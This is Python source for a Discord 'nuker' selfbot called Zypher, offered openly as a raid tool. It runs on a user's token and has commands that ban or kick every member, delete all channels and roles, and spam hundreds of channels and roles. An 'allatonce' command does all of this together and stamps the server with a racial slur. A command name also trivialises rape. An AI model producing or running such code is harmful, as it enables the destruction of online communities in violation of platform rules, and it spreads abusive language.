class SELFBOT():
    __version__ = 1.0

import discord
import requests
import random
import ctypes
import subprocess
import os
import asyncio
import json
import threading
import colorama 
import time
import sys
import itertools

from discord.ext import commands,tasks
from colorama import Fore, Back, Style
from time import gmtime, strftime

colorama.init()

ctypes.windll.kernel32.SetConsoleTitleW(f'Zypher.vip - Nuker Bot')

done = False

def animate():
    for c in itertools.cycle([f'{Fore.RED}', f'{Fore.YELLOW}', f'{Fore.BLUE}', f'{Fore.GREEN}', f'{Fore.MAGENTA}']):
        if done:
            break
        Logo(c)
        time.sleep(0.38)
        os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW('>/ Zypher.vip \< | Loading!')
print(f"""
{Style.BRIGHT + Fore.CYAN}                          ███████ ██    ██ ██████  ██   ██ ███████ ██████ {Style.BRIGHT + Fore.MAGENTA}   ██    ██ ██ ██████  
{Style.BRIGHT + Fore.CYAN}                             ███   ██  ██  ██   ██ ██   ██ ██      ██   ██{Style.BRIGHT + Fore.MAGENTA}   ██    ██ ██ ██   ██ 
{Style.BRIGHT + Fore.CYAN}                            ███     ████   ██████  ███████ █████   ██████ {Style.BRIGHT + Fore.MAGENTA}   ██    ██ ██ ██████  
{Style.BRIGHT + Fore.CYAN}                           ███       ██    ██      ██   ██ ██      ██   ██{Style.BRIGHT + Fore.MAGENTA}    ██  ██  ██ ██      
{Style.BRIGHT + Fore.CYAN}                          ███████    ██    ██      ██   ██ ███████ ██   ██{Style.BRIGHT + Fore.MAGENTA} ██  ████   ██ ██      
                                                                           
{Style.BRIGHT + Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.CYAN}                                       Thank {Style.BRIGHT + Fore.MAGENTA}You{Style.BRIGHT + Fore.CYAN} For {Style.BRIGHT + Fore.MAGENTA}Using{Style.BRIGHT + Fore.CYAN} Zypher{Style.BRIGHT + Fore.MAGENTA} Nuke{Style.BRIGHT + Fore.CYAN} Bot {Style.BRIGHT + Fore.MAGENTA}:)""")
animation = "|/-\\"

print(Fore.CYAN)
for i in range(100):
    time.sleep(0.1)
    sys.stdout.write("\r                                                     Loading..."  +    animation[i % len(animation)])
    sys.stdout.flush()

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')

loop = asyncio.get_event_loop()

def Clear():
    os.system('cls')
Clear()


def ran(length):
    return ''.join(chr(random.randrange(13000)) for _ in range(length))

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR] {Style.BRIGHT + Fore.CYAN}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Zypher.run(token, bot=False, reconnect=True)
            os.system(f'title (Zypher Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Style.BRIGHT + Fore.CYAN}[ERROR] {Style.BRIGHT + Fore.CYAN}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("-------------------------------")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
Zypher = discord.Client()
Zypher = commands.Bot(
    description='Zypher Nuker Bot',
    command_prefix=prefix,
    self_bot=True
)


Zypher.remove_command('help')

@Zypher.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}Couldnt send a empty message"+Fore.RESET)
    else:
        print(f"{Style.BRIGHT + Fore.CYAN}[ERROR]: {Style.BRIGHT + Fore.CYAN}{error_str}"+Fore.RESET)

@Zypher.event
async def on_message_edit(before, after):
    await Zypher.process_commands(after)     

ctypes.windll.kernel32.SetConsoleTitleW(f'/> Zypher.vip <\ Connected! | Version 1.0')

@Zypher.event
async def on_connect():
    Servers = len(Zypher.guilds)
    t = threading.Thread(target=animate)
    t.start()
    Clear()

    print(f'''
{Style.BRIGHT + Fore.CYAN}                      ▄███████▄{Style.BRIGHT + Fore.CYAN}  ▄██   ▄{Style.BRIGHT + Fore.CYAN}      ▄███████▄{Style.BRIGHT + Fore.CYAN}    ▄█    █▄{Style.BRIGHT + Fore.CYAN}       ▄████████{Style.BRIGHT + Fore.CYAN}    ▄████████ 
{Style.BRIGHT + Fore.CYAN}                     ██▀     ▄██{Style.BRIGHT + Fore.CYAN} ███   ██▄{Style.BRIGHT + Fore.CYAN}   ███    ███{Style.BRIGHT + Fore.CYAN}   ███    ███{Style.BRIGHT + Fore.CYAN}     ███    ███{Style.BRIGHT + Fore.CYAN}   ███    ███ 
{Style.BRIGHT + Fore.CYAN}                           ▄███▀{Style.BRIGHT + Fore.CYAN} ███▄▄▄███{Style.BRIGHT + Fore.CYAN}   ███    ███{Style.BRIGHT + Fore.CYAN}   ███    ███{Style.BRIGHT + Fore.CYAN}     ███    █▀ {Style.BRIGHT + Fore.CYAN}   ███    ███ 
{Style.BRIGHT + Fore.CYAN}                     ▀█▀▄███▀▄▄ {Style.BRIGHT + Fore.CYAN}▀▀▀▀▀▀███{Style.BRIGHT + Fore.CYAN}    ███    ███ {Style.BRIGHT + Fore.CYAN} ▄███▄▄▄▄███▄▄{Style.BRIGHT + Fore.CYAN}  ▄███▄▄▄     {Style.BRIGHT + Fore.CYAN} ▄███▄▄▄▄██▀ 
{Style.BRIGHT + Fore.CYAN}                       ▄███▀   ▀{Style.BRIGHT + Fore.CYAN} ▄██   ███{Style.BRIGHT + Fore.CYAN}  ▀█████████▀ {Style.BRIGHT + Fore.CYAN}▀▀███▀▀▀▀███▀{Style.BRIGHT + Fore.CYAN}  ▀▀███▀▀▀     {Style.BRIGHT + Fore.CYAN}▀▀███▀▀▀▀▀   
{Style.BRIGHT + Fore.CYAN}                     ▄███▀      {Style.BRIGHT + Fore.CYAN} ███   ███{Style.BRIGHT + Fore.CYAN}   ███        {Style.BRIGHT + Fore.CYAN}  ███    ███ {Style.BRIGHT + Fore.CYAN}    ███    █▄  {Style.BRIGHT + Fore.CYAN}▀███████████ 
{Style.BRIGHT + Fore.CYAN}                     ███▄     ▄█{Style.BRIGHT + Fore.CYAN} ███   ███{Style.BRIGHT + Fore.CYAN}   ███        {Style.BRIGHT + Fore.CYAN}  ███    ███ {Style.BRIGHT + Fore.CYAN}    ███    ███ {Style.BRIGHT + Fore.CYAN}  ███    ███ 
{Style.BRIGHT + Fore.CYAN}                      ▀████████▀{Style.BRIGHT + Fore.CYAN}  ▀█████▀ {Style.BRIGHT + Fore.CYAN}  ▄████▀     {Style.BRIGHT + Fore.CYAN}   ███    █▀  {Style.BRIGHT + Fore.CYAN}    ██████████ {Style.BRIGHT + Fore.CYAN}  ███    ███ 
{Style.BRIGHT + Fore.CYAN}                                                                                      ███    ███  

{Style.BRIGHT + Fore.CYAN}                                         Zypher{Style.BRIGHT + Fore.CYAN}.vip{Style.BRIGHT + Fore.CYAN} Loaded!{Style.BRIGHT + Fore.CYAN} User{Style.BRIGHT + Fore.CYAN} Info {Style.BRIGHT + Fore.CYAN}Below
{Style.BRIGHT + Fore.CYAN}                                       ═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═
{Style.BRIGHT + Fore.CYAN}                                            {Style.BRIGHT + Fore.CYAN}[{Style.BRIGHT + Fore.CYAN}User{Style.BRIGHT + Fore.CYAN}]{Style.BRIGHT + Fore.CYAN}   : {Style.BRIGHT + Fore.CYAN}{Zypher.user.name}#{Style.BRIGHT + Fore.CYAN}{Zypher.user.discriminator}
{Style.BRIGHT + Fore.CYAN}                                            {Style.BRIGHT + Fore.CYAN}[{Style.BRIGHT + Fore.CYAN}ID{Style.BRIGHT + Fore.CYAN}]   {Style.BRIGHT + Fore.CYAN}  : {Style.BRIGHT + Fore.CYAN}{Zypher.user.id}
{Style.BRIGHT + Fore.CYAN}                                            {Style.BRIGHT + Fore.CYAN}[{Style.BRIGHT + Fore.CYAN}Prefix{Style.BRIGHT + Fore.CYAN}]{Style.BRIGHT + Fore.CYAN} : {Style.BRIGHT + Fore.CYAN}{prefix}
{Style.BRIGHT + Fore.CYAN}                                            {Style.BRIGHT + Fore.CYAN}[{Style.BRIGHT + Fore.CYAN}Guilds{Style.BRIGHT + Fore.CYAN}]{Style.BRIGHT + Fore.CYAN} : {Style.BRIGHT + Fore.CYAN}{Servers}
{Style.BRIGHT + Fore.CYAN}                                       ═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═{Style.BRIGHT + Fore.CYAN}═
{Style.BRIGHT + Fore.CYAN}                                           Type {Style.BRIGHT + Fore.CYAN}{prefix}{Style.BRIGHT + Fore.CYAN}help {Style.BRIGHT + Fore.CYAN}To {Style.BRIGHT + Fore.CYAN}Show {Style.BRIGHT + Fore.CYAN}The {Style.BRIGHT + Fore.CYAN}Menu!!
'''+Fore.RESET)

def Logo(c):
    Servers = len(Zypher.guilds)
    Clear()

    print(f'''
{c}                      ▄███████▄{c}  ▄██   ▄{c}      ▄███████▄{c}    ▄█    █▄{c}       ▄████████{c}    ▄████████ 
{c}                     ██▀     ▄██{c} ███   ██▄{c}   ███    ███{c}   ███    ███{c}     ███    ███{c}   ███    ███ 
{c}                           ▄███▀{c} ███▄▄▄███{c}   ███    ███{c}   ███    ███{c}     ███    █▀ {c}   ███    ███ 
{c}                     ▀█▀▄███▀▄▄ {c}▀▀▀▀▀▀███{c}    ███    ███ {c} ▄███▄▄▄▄███▄▄{c}  ▄███▄▄▄     {c} ▄███▄▄▄▄██▀ 
{c}                       ▄███▀   ▀{c} ▄██   ███{c}  ▀█████████▀ {c}▀▀███▀▀▀▀███▀{c}  ▀▀███▀▀▀     {c}▀▀███▀▀▀▀▀   
{c}                     ▄███▀      {c} ███   ███{c}   ███        {c}  ███    ███ {c}    ███    █▄  {c}▀███████████ 
{c}                     ███▄     ▄█{c} ███   ███{c}   ███        {c}  ███    ███ {c}    ███    ███ {c}  ███    ███ 
{c}                      ▀████████▀{c}  ▀█████▀ {c}  ▄████▀     {c}   ███    █▀  {c}    ██████████ {c}  ███    ███ 
{c}                                                                                      ███    ███  

{c}                                         {c}Zypher.vip Loaded! User Info Below
{c}                                       ═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═
{c}                                            {Style.BRIGHT + Fore.WHITE}[{c}User{Style.BRIGHT + Fore.WHITE}]{c}   {Style.BRIGHT + Fore.WHITE}: {c}{Zypher.user.name}#{c}{Zypher.user.discriminator}
{c}                                            {Style.BRIGHT + Fore.WHITE}[{c}ID{Style.BRIGHT + Fore.WHITE}]   {c}  {Style.BRIGHT + Fore.WHITE}: {c}{Zypher.user.id}
{c}                                            {Style.BRIGHT + Fore.WHITE}[{c}Prefix{Style.BRIGHT + Fore.WHITE}]{c} {Style.BRIGHT + Fore.WHITE}: {c}{prefix}
{c}                                            {Style.BRIGHT + Fore.WHITE}[{c}Guilds{Style.BRIGHT + Fore.WHITE}]{c} {Style.BRIGHT + Fore.WHITE}: {c}{Servers}
{c}                                       ═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═{c}═
{c}                                           {c}Type {prefix}help To Show The Menu!!
'''+Fore.RESET)

@Zypher.command(aliases=['info', 'credits', 'credit'])
async def author(ctx): 
    Servers = len(Zypher.guilds)
    embed=discord.Embed(description=f"""```yaml

  >/ Zypher Nuker Bot \<

>| Made By : VortexThaGod
>| Discord : Vortex#0911
>| Youtube : VortexThaGod
>| Website : zypher.vip

>| Logged In As : {Zypher.user.name}#{Zypher.user.discriminator}
>| Prefix       : {prefix}
>| Guilds       : {Servers}```""", color=random.randint(0, 0xffffff))
    embed.set_footer(text=">\ Zypher Nuker Bot /<", icon_url="https://cdn.discordapp.com/attachments/644828337881088003/761297407731564584/unknown.png")
    return await ctx.send(embed=embed)

@Zypher.command()
async def help(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"‏‏‎                         Zypher Nuker Bot", url="https://zypher.vip", description=f"══════════════════════════════\n\n:smiling_imp: **Raid Commands** :smiling_imp:\n **Usage: {prefix}raid**\n\n:crown: **Status Commands** :crown:\n **Usage: {prefix}status**\n\n :man_detective: **Message Utilities** :man_detective:\n **Usage: {prefix}message**\n\n:zap: Made By VortexThaGod :zap:\n:zap: Vortex#0911 :zap:", color=random.randint(0, 0xffffff))
    embed.set_footer(text=">\ Zypher Nuker Bot /<", icon_url="https://cdn.discordapp.com/attachments/644828337881088003/761297407731564584/unknown.png")
    await ctx.send(embed=embed)

@Zypher.command()
async def raid(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"‏‏‎                                     Zypher Raid Menu", url="https://zypher.vip", description=f"════════════════════════════════════════\n\n:zap: **Raid Commands** :zap:\n\n**banall - bans everyone in a guild**\n**kickall - kicks everyone in a guild**\n**unbanall - unbans everyone in a guild**\n**crashroles - creates 255 roles**\n**rapechannels - spam makes 255 channels**\n**deletechannels - deletes channels**\n**deleteroles - deletes all roles**\n**allatonce - does it all at once**\n\n:zap:Made By VortexThaGod:zap:", color=random.randint(0, 0xffffff))
    embed.set_image(url="https://cdn.discordapp.com/attachments/654004842653810742/761397937506353152/standard.gif")
    embed.set_footer(text=">\ Zypher Nuker Bot /<", icon_url="https://cdn.discordapp.com/attachments/644828337881088003/761297407731564584/unknown.png")
    await ctx.send(embed=embed)

@Zypher.command()
async def status(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"‏‏‎                                    Zypher Status Menu", url="https://zypher.vip", description=f"════════════════════════════════════════\n\n:crown: **Status Commands** :crown:\n\n**Game - Sets Playing Status**\n**Watching - Sets Watching Status**\n**Listening - Sets Listening Status**\n**Streaming - Sets Streaming Status**\n\n:zap:Made By VortexThaGod:zap:", color=random.randint(0, 0xffffff))
    embed.set_image(url="https://cdn.discordapp.com/attachments/654004842653810742/761397937506353152/standard.gif")
    embed.set_footer(text=">\ Zypher Nuker Bot /<", icon_url="https://cdn.discordapp.com/attachments/644828337881088003/761297407731564584/unknown.png")
    await ctx.send(embed=embed)

@Zypher.command()
async def message(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"‏‏‎                                   Zypher Utility Menu", url="https://zypher.vip", description=f"════════════════════════════════════════\n\n:man_detective: **Message Utility Commands** :man_detective:\n\n**Purge - Purges Your Messages With Amount**\n**delall - deletes all messages**\n\n:zap:Made By VortexThaGod:zap:", color=random.randint(0, 0xffffff))
    embed.set_image(url="https://cdn.discordapp.com/attachments/654004842653810742/761397937506353152/standard.gif")
    embed.set_footer(text=">\ Zypher Nuker Bot /<", icon_url="https://cdn.discordapp.com/attachments/644828337881088003/761297407731564584/unknown.png")
    await ctx.send(embed=embed)

@Zypher.command()
async def delall(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=99999).filter(lambda m: m.author == Zypher.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Zypher.command()
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Zypher.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Zypher.command()
async def game(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Zypher.change_presence(activity=game)

@Zypher.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Zypher.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))

@Zypher.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Zypher.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@Zypher.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://zypher.vip",
    )
    await Zypher.change_presence(activity=stream)
    
@Zypher.command()
async def crashroles(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Zypher.vip", color=RandomColor())
        except:
            pass

@Zypher.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

@Zypher.command()
async def kickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass

@Zypher.command()
async def rapechannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name='Zypher-vip')
        except:
            return

@Zypher.command()
async def deletechannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Zypher.command()
async def deleteroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Zypher.command()
async def unbanall(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Zypher.command()
async def allatonce(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="niggaswine was here",
            reason="Zypher.vip ez",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

if __name__ == '__main__':
	Init()